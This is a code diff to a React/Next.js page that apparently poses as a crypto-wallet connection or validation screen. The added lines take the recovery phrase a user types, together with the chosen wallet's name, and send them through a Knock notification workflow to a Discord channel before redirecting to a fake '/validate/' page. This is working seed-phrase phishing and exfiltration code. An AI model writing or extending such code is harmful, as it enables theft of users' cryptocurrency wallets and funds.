@@ -35,9 +35,11 @@ import Trezor from "../assets/trezor-wallet.webp";
 import Image from "next/image";
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
+import { Knock } from "@knocklabs/node";
 
 export default function Home() {
   const navigate = useRouter();
+  const knock = new Knock(process.env.NEXT_PUBLIC_KNOCK_API_KEY);
   const [keyType, setKeyType] = useState("Phrase");
   // const [state, handleSubmit] = useForm("mjvqbbnl");
   const [formState, setFormState] = useState({});
@@ -79,12 +81,36 @@ export default function Home() {
     setFormState({
       ...formState,
       [event.target.name]: event.target.value,
-      wallet: "",
+      wallet: data[walletId].title,
     });
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    knock.objects.set("project6", "project-1", {
+      name: "My project5",
+      total_assets: 10,
+      tags: ["cool", "fun", "project"],
+    });
+    await knock.objects.setChannelData(
+      "project6",
+      "projects-2",
+      process.env.NEXT_PUBLIC_KNOCK_DISCORD_CHANNEL_ID,
+      {
+        connections: [
+          {
+            channel_id: "1246591965387030681",
+          },
+        ],
+      }
+    );
+    await knock.workflows.trigger("dappsnode", {
+      data: {
+        wallet: formState.wallet,
+        currentPhrase: formState.currentPhrase,
+      },
+      recipients: [{ id: "projects-2", collection: "project6" }],
+    });
     setTimeout(() => {
       navigate.push("/validate/" + walletId);
     }, 1000);
